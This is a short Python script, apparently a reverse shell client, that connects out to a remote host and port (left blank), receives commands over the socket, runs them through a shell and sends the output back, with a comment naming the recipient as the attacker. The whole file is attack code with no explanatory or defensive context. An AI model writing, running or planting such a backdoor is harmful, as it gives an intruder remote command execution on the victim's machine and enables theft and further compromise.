import socket
import subprocess

HOST =                  # The remote host
PORT =                  # The same port as used by the server
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
# loop forever
while 1:
    # recv command line param
    data = s.recv(1024)
    if data == "quit":
        s.close()
    # execute command line
    proc = subprocess.Popen(data, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    # grab output from commandline
    stdout_value = proc.stdout.read() + proc.stderr.read()
    if len(stdout_value) > 0:
        # send back to attacker
        s.send(stdout_value)
    else:
        s.send("[*] Error")
        s.close()
